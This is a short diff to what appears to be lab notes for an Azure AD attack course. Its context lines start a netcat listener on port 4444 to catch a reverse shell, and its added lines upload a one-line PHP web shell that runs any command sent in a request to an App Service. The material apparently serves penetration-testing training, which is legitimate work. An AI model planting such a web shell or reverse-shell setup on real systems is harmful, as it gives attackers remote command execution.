@@ -359,3 +359,12 @@ Now, start a listener on your student VM to catch the reverse shell:
 C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444 
 listening on [any] 4444 ...
 ```
+###App Service
+now lets upload hilarious shell:-
+```
+<?php 
+
+system($_REQUEST['cmd']);
+
+?>
+```
